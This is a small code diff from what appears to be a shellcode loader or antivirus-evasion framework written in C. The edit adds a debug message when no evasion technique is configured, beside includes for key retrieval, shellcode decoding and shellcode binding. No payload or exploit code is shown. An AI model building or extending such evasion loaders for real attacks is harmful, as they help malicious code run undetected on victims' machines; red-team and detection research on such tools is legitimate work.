@@ -71,8 +71,12 @@ int main (int argc, char **argv)
 	#include "get_key/get_key.assign"
 	#include "decode_shellcode/decode_shellcode.assign"
 	#include "shellcode_binder/shellcode_binder.assign"
-		
+			
 	// Execute evasion functions
+	if(evasion_functions[0] == NULL) {
+		DEBUG_PRINT(("No evasion techniques applied.\n"));
+	}	
+	
 	for(int i = 0; i < EVASION_ARRAY_SIZE; i++) {
 		if(evasion_functions[i] != NULL) {	
 			DEBUG_PRINT(("Executing evasion function %d.\n", i));
